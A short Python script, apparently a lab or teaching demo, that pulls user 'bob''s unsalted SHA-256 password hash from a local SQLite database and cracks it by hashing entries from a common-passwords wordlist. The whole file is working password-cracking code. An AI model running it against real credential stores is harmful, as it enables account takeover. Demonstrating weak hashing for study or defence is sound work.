import hashlib
import sqlite3

def get_user_hash(username, db_file="users.db"):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def dictionary_attack(target_hash, wordlist_file="10k-most-common-passwords.txt"): #Actual Attack
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                candidate = line.strip()
                if hashlib.sha256(candidate.encode()).hexdigest() == target_hash:
                    return candidate
    except FileNotFoundError:
        print(f"Error: Could not find '{wordlist_file}'.")
    return None

if __name__ == "__main__":
    target_user = "bob"
    target_hash = get_user_hash(target_user)
    
    if target_hash:
        print(f"[*] Target User: {target_user}")
        print(f"[*] Target Hash: {target_hash}")
        result = dictionary_attack(target_hash)
        if result:
            print(f"[+] Success! Password for '{target_user}' is: {result}")
        else:
            print("[-] Password not found in wordlist.")